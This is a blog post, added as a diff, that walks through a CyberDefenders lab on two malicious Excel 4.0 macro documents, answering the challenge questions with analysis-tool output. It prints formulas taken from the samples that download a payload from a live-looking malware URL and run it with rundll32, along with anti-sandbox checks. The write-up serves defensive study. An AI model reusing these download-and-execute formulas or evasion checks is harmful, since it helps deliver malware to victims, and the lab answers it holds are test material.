@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">XLM Macros Writeup - CyberDefenders | Awesome Hugo blog</title>
+<meta property="og:title" content="XLM Macros Writeup - CyberDefenders | Awesome Hugo blog" />
+<meta name="twitter:title" content="XLM Macros Writeup - CyberDefenders | Awesome Hugo blog" />
+<meta itemprop="name" content="XLM Macros Writeup - CyberDefenders | Awesome Hugo blog" />
+<meta name="application-name" content="XLM Macros Writeup - CyberDefenders | Awesome Hugo blog" />
+<meta property="og:site_name" content="Awesome hugo blog" />
+
+<meta name="description" content="Recently, we have seen a resurgence of Excel-based malicous office documents. Howerver, instead of using VBA-style macros, they are using older style Excel 4 macros. This changes our approach to analyzing these documents, requiring a slightly different set of tools. In this challenge, you, as a security blue team analyst will get hands-on with two documents that use Excel 4.0 macros to perform anti-analysis and download the next stage of the attack.">
+<meta itemprop="description" content="Recently, we have seen a resurgence of Excel-based malicous office documents. Howerver, instead of using VBA-style macros, they are using older style Excel 4 macros. This changes our approach to analyzing these documents, requiring a slightly different set of tools. In this challenge, you, as a security blue team analyst will get hands-on with two documents that use Excel 4.0 macros to perform anti-analysis and download the next stage of the attack." />
+<meta property="og:description" content="Recently, we have seen a resurgence of Excel-based malicous office documents. Howerver, instead of using VBA-style macros, they are using older style Excel 4 macros. This changes our approach to analyzing these documents, requiring a slightly different set of tools. In this challenge, you, as a security blue team analyst will get hands-on with two documents that use Excel 4.0 macros to perform anti-analysis and download the next stage of the attack." />
+<meta name="twitter:description" content="Recently, we have seen a resurgence of Excel-based malicous office documents. Howerver, instead of using VBA-style macros, they are using older style Excel 4 macros. This changes our approach to analyzing these documents, requiring a slightly different set of tools. In this challenge, you, as a security blue team analyst will get hands-on with two documents that use Excel 4.0 macros to perform anti-analysis and download the next stage of the attack." />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="https://hba.sid.one/" />
+  <meta property="og:image" content="https://hba.sid.one/" />
+  <meta name="twitter:image" content="https://hba.sid.one/" />
+  <meta name="twitter:image:src" content="https://hba.sid.one/" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-08-04T00:00:00Z />
+    <meta property="article:published_time" content=2023-08-04T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="Naimul islam" />
+    <meta property="article:author" content="Naimul islam" />
+    <meta name="author" content="Naimul islam" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "XLM Macros Writeup - CyberDefenders",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-08-04",
+        "description": "Recently, we have seen a resurgence of Excel-based malicous office documents. Howerver, instead of using VBA-style macros, they are using older style Excel 4 macros. This changes our approach to analyzing these documents, requiring a slightly different set of tools. In this challenge, you, as a security blue team analyst will get hands-on with two documents that use Excel 4.0 macros to perform anti-analysis and download the next stage of the attack.",
+        "wordCount":  618 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-08-04",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Awesome Hugo blog"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.118.2">
+
+    
+
+    <link rel="canonical" href="https://hba.sid.one/posts/xlm-macros-cyberdefenders/">
+    <link href="/style.min.9bd04d0fad85388343088ec85e9afd787ea003e72914d7f57df39c17ab2e7173.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://hba.sid.one/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <b style="font-size: 20px;">
+            <a href="https://hba.sid.one/" class="title">
+                Malxplorer
+                
+            </a>
+        </b>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">XLM Macros Writeup - CyberDefenders</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-08-04T00:00:00&#43;00:00" itemprop="datePublished"> 4 Aug 2023 </time>
+                </div>
+                
+            </header>
+            <details class="toc">
+                <summary><b>Table of Contents</b></summary>
+                <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-what-is-the-document-decryption-password">1. What is the document decryption password?</a></li>
+    <li><a href="#2-this-document-contains-six-hidden-sheets-what-are-their-names-provide-the-value-of-the-one-starting-with-s">2. This document contains six hidden sheets. What are their names? Provide the value of the one starting with S.</a></li>
+    <li><a href="#3-what-url-is-the-malware-using-to-download-the-next-stage-only-include-the-second-level-and-top-level-domain-for-example-xyzcom">3. What URL is the malware using to download the next stage? Only include the second-level and top-level domain. For example, xyz.com.</a></li>
+    <li><a href="#4-what-malware-family-was-this-document-attempting-to-drop">4. What malware family was this document attempting to drop?</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#5-this-document-has-a-very-hidden-sheet-what-is-the-name-of-this-sheet">5. This document has a very hidden sheet. What is the name of this sheet?</a></li>
+    <li><a href="#6-this-document-uses-regexe-what-registry-key-is-it-checking">6. This document uses reg.exe. What registry key is it checking?</a></li>
+    <li><a href="#7-from-the-use-of-regexe-what-value-of-the-assessed-key-indicates-a-sandbox-environment">7.  From the use of reg.exe, what value of the assessed key indicates a sandbox environment?</a></li>
+    <li><a href="#8-this-document-performs-several-additional-anti-analysis-checks-what-excel-4-macro-function-does-it-use">8. This document performs several additional anti-analysis checks. What Excel 4 macro function does it use?</a></li>
+    <li><a href="#9-this-document-checks-for-the-name-of-the-environment-in-which-excel-is-running-what-value-is-it-using-to-compare">9. This document checks for the name of the environment in which Excel is running. What value is it using to compare?</a></li>
+    <li><a href="#10-what-type-of-payload-is-downloaded">10. What type of payload is downloaded?</a></li>
+    <li><a href="#11-what-url-does-the-malware-download-the-payload-from">11. What URL does the malware download the payload from?</a></li>
+    <li><a href="#12-what-is-the-filename-that-the-payload-is-saved-as">12. What is the filename that the payload is saved as?</a></li>
+    <li><a href="#13-how-is-the-payload-executed-for-example-mshtaexe">13. How is the payload executed? For example, mshta.exe</a></li>
+    <li><a href="#14-what-was-the-malware-family">14. What was the malware family?</a></li>
+  </ul>
+</nav>
+            </details><div class="page-content">
+                <p><img src="https://cyberdefenders.org/media/terraform/XLM%20Macros/XLM_Macros.jpg" alt=""></p>
+<blockquote>
+<p>Recently, we have seen a resurgence of Excel-based malicous office documents. Howerver, instead of using VBA-style macros, they are using older style Excel 4 macros. This changes our approach to analyzing these documents, requiring a slightly different set of tools. In this challenge, you&rsquo;ll get hands-on with two documents that use Excel 4.0 macros to perform anti-analysis and download the next stage of the attack.</p>
+</blockquote>
+<h1 id="sample-1">Sample 1</h1>
+<h2 id="1-what-is-the-document-decryption-password">1. What is the document decryption password?</h2>
+<p>First check if the file is encrypted.</p>
+<pre tabindex="0"><code>root@06c2f2076f07 /shared# msoffcrypto-tool -t -v sample1.bin  
+Version: 5.0.1
+sample1.bin: encrypted
+</code></pre><p>Yes. Now get the pass.</p>
+<pre tabindex="0"><code>root@1ae0377cd588 /shared# msoffcrypto-crack.py sample1.bin  
+Password found: VelvetSweatshop
+</code></pre><h2 id="2-this-document-contains-six-hidden-sheets-what-are-their-names-provide-the-value-of-the-one-starting-with-s">2. This document contains six hidden sheets. What are their names? Provide the value of the one starting with S.</h2>
+<p>After getting the password, I decrypted the file.</p>
+<pre tabindex="0"><code>msoffcrypto-tool -p VelvetSweatshop sample1.bin dec-sample1.bin
+</code></pre><p>Got sheet information by using oledump with plugin_biff.</p>
+<pre tabindex="0"><code>root@06c2f2076f07 /shared# oledump.py -p ~/DidierStevensSuite/plugin_biff.py --pluginoptions &#34;-x&#34; dec-sample1.bin  
+ 1:       114 &#39;\x01CompObj&#39;
+ 2:       368 &#39;\x05DocumentSummaryInformation&#39;
+ 3:       200 &#39;\x05SummaryInformation&#39;
+ 4:     92329 &#39;Workbook&#39;
+              Plugin: BIFF plugin  
+                0085     25 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - SOCWNEScLLxkLhtJp
+                0085     25 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - OHqYbvYcqmWjJJjsF
+                0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - Macro2
+                0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - Macro3
+                0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - Macro4
+                0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - Macro5
+                0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet1
+                0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet2
+                0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet3
+[...]
+</code></pre><h2 id="3-what-url-is-the-malware-using-to-download-the-next-stage-only-include-the-second-level-and-top-level-domain-for-example-xyzcom">3. What URL is the malware using to download the next stage? Only include the second-level and top-level domain. For example, xyz.com.</h2>
+<pre tabindex="0"><code>root@1ae0377cd588 /shared# strings dec-sample1.bin | re-search.py -n url
+http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exe~
+http://rilaer.com/IfAmGZIJjbw
+http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exe
+</code></pre><h2 id="4-what-malware-family-was-this-document-attempting-to-drop">4. What malware family was this document attempting to drop?</h2>
+<p>Found the sample on malwarebazar</p>
+<p><img src="https://imgur.com/ZlqOmcd" alt=""></p>
+<h1 id="sample-2">Sample 2</h1>
+<h2 id="5-this-document-has-a-very-hidden-sheet-what-is-the-name-of-this-sheet">5. This document has a very hidden sheet. What is the name of this sheet?</h2>
+<p>First, checking if the file is encrypted:</p>
+<pre tabindex="0"><code>root@06c2f2076f07 /shared# msoffcrypto-tool -t -v sample2.bin
+Version: 5.0.1
+sample2.bin: not encrypted
+</code></pre><p>Using oledump with plugin_biff plugin:</p>
+<pre tabindex="0"><code>oledump.py sample2.bin -p ~/DidierStevensSuite/plugin_biff.py --pluginoptions &#34;-x&#34;
+</code></pre><pre tabindex="0"><code>[...]
+0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet1
+0085     18 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, very hidden - CSHykdYHvi
+[...]
+</code></pre><h2 id="6-this-document-uses-regexe-what-registry-key-is-it-checking">6. This document uses reg.exe. What registry key is it checking?</h2>
+<pre tabindex="0"><code>[...]
+&#39;0207    131 STRING : String Value of a Formula - b\&#39;&#34;VBAWarnings&#34;=dword:00000002\&#39;&#39;
+[...]
+</code></pre><h2 id="7-from-the-use-of-regexe-what-value-of-the-assessed-key-indicates-a-sandbox-environment">7.  From the use of reg.exe, what value of the assessed key indicates a sandbox environment?</h2>
+<p>0x1</p>
+<h2 id="8-this-document-performs-several-additional-anti-analysis-checks-what-excel-4-macro-function-does-it-use">8. This document performs several additional anti-analysis checks. What Excel 4 macro function does it use?</h2>
+<p><img src="https://imgur.com/undefined" alt=""></p>
+<p>(part of olevba output)</p>
+<p>All these checks are used by the malware to see if its running in a sand boxed environment. Using this <a href="https://malware.news/t/excel-4-macros-get-workspace-reference/38892">reference</a>, This is what the highlighted keys check:</p>
+<p><strong>GET.WORKSPACE(2):</strong> Version of Excel Running
+<strong>GET.WORKSPACE(13):</strong> Workspace Width
+<strong>GET.WORKSPACE(14):</strong> Workspace Height
+<strong>GET.WORKSPACE(19):</strong> If a mouse is present
+<strong>GET.WORKSPACE(42):</strong> If Machine can play Sound</p>
+<h2 id="9-this-document-checks-for-the-name-of-the-environment-in-which-excel-is-running-what-value-is-it-using-to-compare">9. This document checks for the name of the environment in which Excel is running. What value is it using to compare?</h2>
+<p>Windows</p>
+<pre tabindex="0"><code>FORMULA(&#34;=SHARED FMLA at rowx=0 colx=1IF(ISNUMBER(SEARCH(&#34;&#34;Windows&#34;&#34;,GET.WORKSPACE(1))), ,CLOSE(TRUE))&#34;,K7)
+</code></pre><h2 id="10-what-type-of-payload-is-downloaded">10. What type of payload is downloaded?</h2>
+<p>DLL</p>
+<pre tabindex="0"><code>FORMULA(&#34;=CALL(&#34;&#34;Shell32&#34;&#34;,&#34;&#34;ShellExecuteA&#34;&#34;,&#34;&#34;JJCCCJJ&#34;&#34;,0,&#34;&#34;open&#34;&#34;,&#34;&#34;C:\Windows\system32\rundll32.exe&#34;&#34;,&#34;&#34;c:\Users\Public\bmjn5ef.html,DllRegisterServer&#34;&#34;,0,5)&#34;,K11)
+</code></pre><h2 id="11-what-url-does-the-malware-download-the-payload-from">11. What URL does the malware download the payload from?</h2>
+<p>https[://]ethelenecrace[.]xyz/fbb3</p>
+<pre tabindex="0"><code>FORMULA(&#34;=CALL(&#34;&#34;urlmon&#34;&#34;,&#34;&#34;URLDownloadToFileA&#34;&#34;,&#34;&#34;JJCCJJ&#34;&#34;,0,&#34;&#34;https://ethelenecrace.xyz/fbb3&#34;&#34;,&#34;&#34;c:\Users\Public\bmjn5ef.html&#34;&#34;,0,0)&#34;,K8)
+</code></pre><h2 id="12-what-is-the-filename-that-the-payload-is-saved-as">12. What is the filename that the payload is saved as?</h2>
+<p>bmjn5ef.html</p>
+<h2 id="13-how-is-the-payload-executed-for-example-mshtaexe">13. How is the payload executed? For example, mshta.exe</h2>
+<p>rundll32.exe</p>
+<pre tabindex="0"><code>FORMULA(&#34;=CALL(&#34;&#34;Shell32&#34;&#34;,&#34;&#34;ShellExecuteA&#34;&#34;,&#34;&#34;JJCCCJJ&#34;&#34;,0,&#34;&#34;open&#34;&#34;,&#34;&#34;C:\Windows\system32\rundll32.exe&#34;&#34;,&#34;&#34;c:\Users\Public\bmjn5ef.html,DllRegisterServer&#34;&#34;,0,5)&#34;,K11)
+</code></pre><h2 id="14-what-was-the-malware-family">14. What was the malware family?</h2>
+<p>After submitting the md5 on VT, got zloader.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <small class="footer_copyright">
+        © 2023 Naimul Islam.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="https://hba.sid.one/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
